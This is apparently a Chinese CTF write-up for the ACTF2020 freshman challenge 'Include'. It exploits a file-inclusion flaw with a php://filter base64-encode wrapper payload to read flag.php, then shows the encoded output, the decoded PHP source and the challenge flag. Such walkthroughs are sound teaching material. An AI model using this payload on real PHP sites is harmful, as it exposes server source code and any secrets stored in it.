---
title: '[ACTF2020 新生赛]Include'
date: '2025-05-09T21:01:06+08:00'
weight: 
draft: false
description: '[ACTF2020 新生赛]Include'
---

检查页面元素发现提示：`<body><a href="?file=flag.php">tips</a></body>`

利用 **任意文件包含漏洞** 和 **php 伪协议** 读取 `flag.php

```text
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

进行 base64 解码，获得 `flag`：`flag{56a53bc6-5778-4ddb-bde2-a8a73ab475ad}`

```text
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NTZhNTNiYzYtNTc3OC00ZGRiLWJkZTItYThhNzNhYjQ3NWFkfQo=
```

```php
<?php
echo "Can you find out the flag?";
//flag{56a53bc6-5778-4ddb-bde2-a8a73ab475ad}
```